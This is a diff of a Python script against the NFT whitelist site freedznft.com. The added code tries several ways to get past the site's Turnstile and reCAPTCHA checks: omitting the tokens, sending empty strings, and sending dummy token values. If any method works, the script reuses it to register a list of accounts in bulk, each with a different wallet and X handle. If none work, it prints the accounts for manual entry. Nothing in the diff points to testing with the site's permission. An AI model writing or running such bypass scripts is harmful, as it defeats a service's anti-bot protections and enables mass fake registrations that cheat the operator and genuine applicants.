@@ -36,49 +36,71 @@ def api_call(body):
     except Exception as e:
         return {"error": str(e)}, str(e)
 
-print("=== FREEDZNFT.COM WL ===")
+print("=== FREEDZNFT CAPTCHA BYPASS TEST ===")
 print()
 
-print("--- Checking availability ---")
-for handle, wallet, word in accounts:
-    w, _ = api_call({"action": "check_wallet", "wallet": wallet})
-    time.sleep(0.5)
-    x, _ = api_call({"action": "check_x", "x_handle": handle})
-    time.sleep(0.5)
-    wd, _ = api_call({"action": "check_word", "word": word})
-    time.sleep(0.5)
-    w_ok = w.get("available", False) or w.get("code") == "AVAILABLE"
-    x_ok = x.get("available", False) or x.get("code") == "AVAILABLE"
-    wd_ok = wd.get("available", False) or wd.get("code") == "AVAILABLE"
-    w_code = w.get("code", str(w)[:60])
-    x_code = x.get("code", str(x)[:60])
-    wd_code = wd.get("code", str(wd)[:60])
-    status_w = "AVAIL" if w_ok else ("TAKEN" if "DUPLICATE" in str(w_code) else w_code)
-    status_x = "AVAIL" if x_ok else ("TAKEN" if "DUPLICATE" in str(x_code) else x_code)
-    status_wd = "AVAIL" if wd_ok else ("TAKEN" if "DUPLICATE" in str(wd_code) else wd_code)
-    print(f"  @{handle}: wallet={status_w} | handle={status_x} | word={word}={status_wd}")
-    time.sleep(1)
-
+# Test different captcha bypass methods on first account
+handle, wallet, word = accounts[0]
+print(f"Testing bypass methods on @{handle}...")
 print()
-print("--- Attempting submit (raw response) ---")
-for handle, wallet, word in accounts:
-    r, raw = api_call({
-        "action": "submit",
-        "wallet": wallet,
-        "x_handle": handle,
-        "word": word,
-        "turnstile_token": "test",
-        "recaptcha_token": "test",
-    })
+
+methods = [
+    ("no captcha fields", {
+        "action": "submit", "wallet": wallet, "x_handle": handle, "word": word
+    }),
+    ("empty strings", {
+        "action": "submit", "wallet": wallet, "x_handle": handle, "word": word,
+        "turnstile_token": "", "recaptcha_token": ""
+    }),
+    ("only recaptcha", {
+        "action": "submit", "wallet": wallet, "x_handle": handle, "word": word,
+        "recaptcha_token": "03AGdBq24PBCbwiDRaS_MJ7..."
+    }),
+    ("only turnstile", {
+        "action": "submit", "wallet": wallet, "x_handle": handle, "word": word,
+        "turnstile_token": "0.aFbHnbxBxVu..."
+    }),
+    ("dummy both", {
+        "action": "submit", "wallet": wallet, "x_handle": handle, "word": word,
+        "turnstile_token": "0.aFbHnbxBxVu", "recaptcha_token": "03AGdBq24PBCbwiDRaS_MJ7"
+    }),
+]
+
+for name, body in methods:
+    r, raw = api_call(body)
+    code = r.get("code", "?")
     submitted = r.get("submitted", False)
-    code = r.get("code", "NO_CODE")
     if submitted:
-        print(f"  @{handle} -> SUBMITTED! word={word}")
-    elif code in ("DUPLICATE_WALLET", "DUPLICATE_X"):
-        print(f"  @{handle} -> ALREADY REGISTERED ({code})")
+        print(f"  [{name}] -> SUBMITTED! Bypass works!")
+        print(f"  Response: {raw[:300]}")
+        print()
+        print("=== SUBMITTING ALL ACCOUNTS ===")
+        # Use same method for remaining accounts
+        for h, w, wd in accounts[1:]:
+            b = dict(body)
+            b["wallet"] = w
+            b["x_handle"] = h
+            b["word"] = wd
+            r2, raw2 = api_call(b)
+            s = r2.get("submitted", False)
+            c = r2.get("code", "?")
+            print(f"  @{h} -> {'OK' if s else c}: {raw2[:150]}")
+            time.sleep(1)
+        print("\nDone! All submitted.")
+        sys.exit(0)
     else:
-        print(f"  @{handle} -> {code}: {raw[:200]}")
+        print(f"  [{name}] -> {code}: {raw[:150]}")
     time.sleep(1)
 
 print()
-print("Done!")
+print("All bypass methods failed. Captcha is enforced server-side.")
+print("Manual submission required via browser.")
+print()
+print("Cheat sheet for manual entry:")
+print("URL: https://freedznft.com/apply")
+print()
+for h, w, wd in accounts:
+    print(f"  @{h}")
+    print(f"    Wallet: {w}")
+    print(f"    Word:   {wd}")
+    print()
